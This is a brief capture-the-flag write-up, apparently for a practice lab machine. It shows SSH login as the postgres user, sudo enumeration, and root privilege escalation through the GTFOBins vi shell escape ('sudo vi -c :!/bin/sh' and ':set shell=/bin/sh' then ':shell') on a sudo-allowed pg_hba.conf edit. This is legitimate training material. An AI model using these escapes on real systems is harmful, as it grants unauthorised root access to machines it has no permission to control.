Connect through ssh with postgres user
```bash
$ ssh postgres@10.129.181.9
```

Enumerate programs that can be executed with sudo
```bash
$ sudo -l
```

Go to [gtfobins](https://gtfobins.github.io/gtfobins/vi/#sudo) to search if we can abuse vi.
```ad-info
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.  

sudo vi -c ':!/bin/sh' /dev/null
```
![[Assets/Pasted image 20220612124132.png]]
But this DOES NOT work so lets execute the other command that can be run using sudo
```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

1. Insert the comand `:set shell=/bin/sh`
2. Execute `:shell` 

Now we are root. The root flag is in /root.